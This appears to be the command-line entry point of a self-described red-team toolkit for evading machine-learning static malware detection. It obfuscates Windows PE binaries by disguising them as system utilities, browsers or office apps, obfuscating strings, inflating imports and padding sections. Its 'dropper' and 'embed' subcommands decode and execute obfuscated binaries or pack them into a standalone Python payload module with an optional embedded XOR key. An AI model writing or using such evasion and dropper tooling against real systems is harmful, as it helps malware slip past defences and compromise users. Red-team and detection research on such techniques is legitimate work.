import argparse
import logging
import os
import sys
from pathlib import Path
from typing import List

from .rt_evade.core.guards import require_redteam_mode, guard_can_write
from .rt_evade.core.pipeline import TransformPipeline
from .rt_evade.core.transform import TransformPlan
from .rt_evade.dropper.embed import generate_embedded_payload_module
from .rt_evade.pe.obfuscator import PEObfuscator, PEObfuscationConfig


def _setup_logging() -> None:
    level = logging.getLevelName(os.getenv("LOG_LEVEL", "INFO").upper())
    logging.basicConfig(level=level, format="time=%(asctime)s level=%(levelname)s msg=%(message)s")


def load_bytes_from_file(path: str) -> bytes:
    with open(path, "rb") as f:
        return f.read()


def write_bytes_to_file(path: str, data: bytes) -> None:
    guard_can_write()
    with open(path, "wb") as f:
        f.write(data)


def build_default_plan(args: argparse.Namespace) -> List[TransformPlan]:
    plans: List[TransformPlan] = []
    if args.pe_obfuscate:
        config = PEObfuscationConfig(
            enable_mimicry=args.pe_mimicry,
            enable_string_obfuscation=args.pe_strings,
            enable_import_inflation=args.pe_imports,
            enable_section_padding=args.pe_padding,
            target_category=args.pe_category
        )
        obfuscator = PEObfuscator(config)
        plans.append(obfuscator.create_obfuscation_plan(b""))  # Will be applied to actual data
    return plans


def main(argv: List[str] | None = None) -> int:
    _setup_logging()
    parser = argparse.ArgumentParser(description="Red-team static ML evasion toolkit (binary-in, binary-out)")
    sub = parser.add_subparsers(dest="cmd", required=False)

    # transform subcommand (default)
    p_transform = sub.add_parser("transform", help="Apply PE obfuscation transforms to input and optionally write output")
    p_transform.add_argument("input", help="Path to input PE file")
    p_transform.add_argument("--output", help="Optional output path (requires ALLOW_ACTIONS=true)")
    
    # PE obfuscation options
    p_transform.add_argument("--pe-obfuscate", action="store_true", default=True, help="Apply PE-aware obfuscation (default: True)")
    p_transform.add_argument("--pe-mimicry", action="store_true", default=True, help="Enable PE mimicry (default: True)")
    p_transform.add_argument("--pe-strings", action="store_true", default=True, help="Enable PE string obfuscation (default: True)")
    p_transform.add_argument("--pe-imports", action="store_true", default=True, help="Enable PE import inflation (default: True)")
    p_transform.add_argument("--pe-padding", action="store_true", default=True, help="Enable PE section padding (default: True)")
    p_transform.add_argument("--pe-category", choices=["system_utility", "web_browser", "office_app"], help="Target software category for mimicry")

    # dropper subcommand
    p_drop = sub.add_parser("dropper", help="Decode obfuscated binary and execute it (runtime)")
    p_drop.add_argument("input", help="Path to obfuscated binary to execute")
    p_drop.add_argument("--no-strings", action="store_true")
    p_drop.add_argument("--xor", action="store_true")
    p_drop.add_argument("--", dest="passthrough", nargs=argparse.REMAINDER)

    # embed subcommand
    p_embed = sub.add_parser("embed", help="Embed obfuscated PE into Python module for standalone dropper")
    p_embed.add_argument("input", help="Path to obfuscated PE binary")
    p_embed.add_argument("--output", help="Output Python module path (default: embedded_payload.py)")
    p_embed.add_argument("--embed-key", action="store_true", help="Embed DECODE_KEY into payload module (no env needed at runtime)")
    p_embed.add_argument("--base64-strings", action="store_true", help="Apply Base64 string obfuscation")
    p_embed.add_argument("--xor-pack", action="store_true", help="Apply XOR packing (requires DECODE_KEY)")
    parser.add_argument("--output", help="Optional output path (requires ALLOW_ACTIONS=true)")
    args = parser.parse_args(argv)

    require_redteam_mode()

    if args.cmd == "dropper":
        # Delegate to dropper CLI
        from .rt_evade.dropper.cli import main as dropper_main

        return dropper_main([args.input] + (["--no-strings"] if args.no_strings else []) + (["--xor"] if args.xor else []) + (["--"] + (args.passthrough or []) if args.passthrough else []))

    if args.cmd == "embed":
        # Handle embed subcommand
        original = load_bytes_from_file(args.input)
        
        # Apply PE obfuscation
        pipeline = TransformPipeline()
        if args.pe_obfuscate:
            config = PEObfuscationConfig(
                enable_mimicry=args.pe_mimicry,
                enable_string_obfuscation=args.pe_strings,
                enable_import_inflation=args.pe_imports,
                enable_section_padding=args.pe_padding,
                target_category=args.pe_category
            )
            obfuscator = PEObfuscator(config)
            pipeline.add(obfuscator.create_obfuscation_plan(original))
        
        obfuscated = pipeline.apply_all(original)
        
        # Generate embedded module
        output_path = Path(args.output or "embedded_payload.py")
        module_path, payload_hash = generate_embedded_payload_module(obfuscated, output_path)
        
        logging.info("action=embed_complete module=%s hash=%s", module_path, payload_hash)
        return 0

    # Default: transform
    ns = args if args.cmd == "transform" else p_transform.parse_args(argv or [])

    original = load_bytes_from_file(ns.input)

    pipeline = TransformPipeline()
    for plan in build_default_plan(ns):
        pipeline.add(plan)

    transformed = pipeline.apply_all(original)

    if getattr(ns, "output", None):
        write_bytes_to_file(ns.output, transformed)
        logging.info("action=write_output path=%s size=%d", ns.output, len(transformed))
    else:
        logging.info("action=dry_run size=%d note=use --output and ALLOW_ACTIONS=true to write", len(transformed))

    return 0


if __name__ == "__main__":
    sys.exit(main())

